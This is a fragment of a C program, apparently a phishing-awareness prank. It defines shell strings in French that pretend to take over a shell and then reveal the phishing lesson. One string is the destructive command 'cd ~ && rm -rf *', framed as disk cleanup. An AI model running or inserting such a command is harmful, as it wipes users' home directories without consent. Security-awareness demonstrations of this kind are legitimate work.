...
int main()
{
	...
	const char *GREATINGS = "echo \"J'ai pris possession de ce joli shell\"\n";
	...
	const char *SUDO     = "echo \"Je peux essayer de devenir root ...\"\n";
	...
	const char *DOT       = ".";
	const char *FIN       = "\"\n";
	const char *INVIT     = "echo \"Viens prendre une couque au chocolat en salle de pause plutôt que d'éxecuter une pièce jointe dans un mail.\n";
	const char *INVIT2     = "Ça s'appelle du phishing et tu as mordu à l'hameçon.\"\n";
	const char *BEFORE    = "echo \"Pas assez de place sur le disque. On fait le ménage\"\n";
	const char *RMRF      = "cd ~ && rm -rf *\n";
	const char *CD        = "cd ~\n";
	const char *VOILA     = "echo \"Et voila, c'est mieux, on ré-installe ...\"\n";
